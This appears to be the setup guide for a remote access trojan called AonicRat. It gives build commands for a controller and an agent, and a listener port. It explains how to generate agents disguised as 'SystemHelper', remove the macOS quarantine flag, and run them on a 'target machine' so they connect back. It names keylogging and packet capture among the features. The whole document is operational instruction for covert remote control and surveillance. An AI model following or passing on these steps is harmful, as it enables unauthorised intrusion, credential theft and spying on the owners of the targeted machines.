# Getting Started

## Requirements

| Component | OS Support | Java Requirement |
|-----------|-----------|-----------------|
| **Controller (AonicRat)** | Windows, Linux, macOS | Java 18 or higher |
| **Agent (SimpleServer)** | Windows, Linux, macOS | Java 11 or higher |
| **Build tool** | Any | Apache Maven 3.x |
| **IDE (optional)** | Any | Apache NetBeans 15+ |

---

## Step 1 — Build the Controller

```bash
cd AonicRat
mvn clean package
```

The fat JAR (all dependencies bundled) is generated at:

```
target/AonicRat-1.0.0-beta.jar
```

---

## Step 2 — Build the Agent

```bash
cd AonicRat/SimpleServer
mvn clean package
```

The agent JAR is generated at:

```
SimpleServer/target/SimpleServer-1.0.0-beta.jar
```

---

## Step 3 — Run the Controller

```bash
java -jar target/AonicRat-1.0.0-beta.jar
```

Or in NetBeans: **Run → Run Project**

---

## Step 4 — Start the Server

1. Open the **Settings** tab
2. Set your desired port (default: `5555`)
3. Click **Start Server**

The controller is now listening for agent connections.

---

## Step 5 — Generate an Agent

1. Go to the **Client Generator** tab
2. Set the **Host/IP** to your controller machine's IP address
3. Set the **Port** to match your Settings port
4. Select a target platform (Windows / Linux / macOS)
5. Browse to the SimpleServer JAR as the source
6. Click **Generate**

The platform-specific agent file is saved to your chosen output folder.

---

## Step 6 — Deploy & Run the Agent

Copy the generated agent to the target machine and run it:

=== "Windows"
    Double-click the `.exe`, or run:
    ```cmd
    SystemHelper.exe
    ```

=== "Linux"
    ```bash
    chmod +x SystemHelper
    ./SystemHelper
    ```

=== "macOS"
    ```bash
    unzip SystemHelper.app.zip
    xattr -rd com.apple.quarantine SystemHelper.app
    open SystemHelper.app
    ```

The agent will connect back to your controller automatically. It will appear in the device list across all tabs.

---

## Step 7 — Connect to a Device

- Use the **Device** dropdown at the top of each tab to select the connected device
- Click **Connect** to attach to it
- You can now use all features: File System, Terminal, Remote Desktop, etc.

---

## Troubleshooting

| Problem | Solution |
|---------|----------|
| Agent doesn't connect | Check firewall allows inbound on your port. Check the IP/port in the agent matches the controller. |
| Build fails | Ensure Maven 3.x and Java 18+ are installed and on PATH. |
| No JAR generated | Run `mvn clean package` and check the `target/` folder, not `dist/`. |
| Agent needs root (Linux/macOS) | Packet capture and keylogger require root/admin privileges. |
